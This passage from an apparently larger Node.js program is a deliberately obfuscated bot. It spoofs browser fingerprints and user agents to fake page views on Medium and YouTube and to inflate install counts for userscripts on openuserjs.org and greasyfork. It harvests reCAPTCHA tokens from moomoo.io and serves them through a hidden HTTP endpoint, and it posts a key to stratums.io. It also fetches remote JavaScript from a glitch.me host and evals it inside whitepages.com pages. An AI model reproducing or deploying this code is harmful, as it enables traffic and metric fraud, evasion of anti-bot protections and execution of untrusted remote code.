      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + Y(0x8, ')ExH') + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + X(0x12) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + X(0x10) + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1395 + 0x2eb * 0xb + 0x89d * -0x6
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1c40 + -0x1 * 0x5e5 + 0x1 * 0x2225)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1f94 + 0x18e7 + -0x3817), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * 0x2002 + 0x147c + -0x201 * 0x1a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x3 * 0x787 + 0x8d8 * -0x3 + 0x105f * 0x3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1bd7 + -0x1bb2 + -0x25; w < getRandomInt(0x47 * -0x15 + -0x13d1 + 0x19a5, -0x19a0 + 0xab9 + 0xeec); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xfea2 + -0xa5 * -0xd6 + -0x9e30);
        }
      }();
    }, 0x1 * -0x18cb + -0x2 * -0x2e7 + -0xb * -0x1c3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x615 * 0x5 + 0x8a * 0x29 + -0x3483;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xb * 0xab + -0x129f + 0xb46, -0x614 * -0x2 + -0x1 * 0x1e9e + 0x12a8)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const Z = b;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + Z(0xb, '@MsY') + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x6cb6 + 0x60 * 0x221 + 0x3a * 0x5f);
    }, 0x2 * 0x879 + 0x172c + -0x1 * 0x27ba), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x891 * -0x2 + -0x2f3 + -0xe2f;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x71 * 0xa + 0x1b52 + -0xb30), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2 * 0xa39 + 0x709 * -0x1 + -0xd69 * 0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xdf52f * 0x1 + 0x9101 * -0x23 + -0xa * -0x1f5c2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x94c + -0xa * 0x145 + 0x3ca);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x17ae + 0x1090 + -0x2776);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0xfe7 + 0x1f48 + -0xf9f);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1edf + 0x1162 + 0xd7d);
    let h = e[f];
    if (b['XpvaEZ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x3 * -0x771 + 0x1 * 0x1c8b + 0xc7 * -0x8, s, t, u = 0x12a * -0x4 + -0x1 * 0x1cae + 0x22 * 0xfb; t = n['charAt'](u++); ~t && (s = r % (-0x9 * -0x111 + -0x181a + 0xe85) ? s * (0x2066 + -0x1bd7 + 0x44f * -0x1) + t : t, r++ % (0x1 * -0x469 + 0xa6b + -0x5fe)) ? p += String['fromCharCode'](-0xe33 + 0x19e5 + 0x21 * -0x53 & s >> (-(-0xaaf * -0x2 + -0xdab + -0x7b1) * r & -0x1 * 0x18ab + -0x1 * -0x1d0a + -0x15 * 0x35)) : 0x25f4 * -0x1 + 0x1 * -0x23d5 + -0x5ad * -0xd) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * 0x160b + 0x1936 + 0x2f41 * -0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * -0x1261 + 0x7 * -0x377 + -0x130 * -0x5))['slice'](-(-0x1154 + 0x7 * 0x4c5 + -0x100d));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1d * -0xae + 0x99f * 0x3 + -0x1 * 0x3093,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x23a2 * 0x1 + 0x2700 + -0x35e * 0x1; u < 0x15fe + -0x164 * -0x11 + -0x2ca2; u++) {
          p[u] = u;
        }
        for (u = 0x8 * 0x360 + 0x19bc + -0x34bc; u < 0x408 + 0x115 + -0x41d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xdea + 0x1 * 0x1047 + -0x15d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1d5a + -0xeba + -0x326 * -0xe, q = -0x591 + 0x24 * -0x57 + 0x11cd;
        for (let v = -0x1217 * 0x1 + 0x1431 + -0x21a; v < n['length']; v++) {
          u = (u + (-0xd74 + -0x34f * 0x9 + 0x2b3c)) % (0x21f0 + -0x3be * 0x5 + -0xe3a), q = (q + p[u]) % (0x6dd + 0x14b5 + -0x1a92), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2278 + -0x5 * -0x1 + 0x2373)]);
        }
        return t;
      };
      b['RJedPw'] = m, c = arguments, b['XpvaEZ'] = !![];
    }
    const j = e[-0xa26 + 0x1ae9 + -0x10c3],
      k = f + j,
      l = c[k];
    return !l ? (b['WBmgmM'] === undefined && (b['WBmgmM'] = !![]), h = b['RJedPw'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xe5 + 0x1b8b + -0xfb * 0x1d) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x109d + 0x35 * 0x46 + -0x1 * -0x220));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x29 + 0x741 * 0x4 + -0x1d2d, D['indexOf']('\x20'));
        return B ? E['slice'](-0x95e * -0x1 + -0x1e6c + 0x150e, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x179e * 0x1 + -0x38e1 * -0x1 + 0x129 * 0x5),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1424 + 0x150d + -0x221),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      a0(0x0) + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + a1(0x7) + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1c02 + -0x21d6 + -0x1eec * -0x2; k < 0x8cc + 0x26a5 + -0x2f6d; k++)
    setTimeout(f, (-0x7 * -0x16ee + -0x44ec + -0x1 * -0x8eca) * k * getRandomInt(0x194c * 0x1 + 0xc9 + -0x1a14, 0xa * -0x311 + -0xe5b + 0x2d08));
  setInterval(() => {
    f();
    for (let l = 0x139d * 0x1 + 0x239 + -0x2 * 0xaeb; l < -0x1343 + -0x15d + -0x14a4 * -0x1; l++)
      setTimeout(f, (-0x2 * 0xe924 + 0x1 * -0xd102 + -0x2 * -0x1c6d5) * l * getRandomInt(0x1 * -0x19fd + 0x1088 + -0x976 * -0x1, 0x1c9e + -0xb5 * 0x16 + -0xd0d));
  }, 0x2cfa3c + -0x661634 + 0x700a78);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
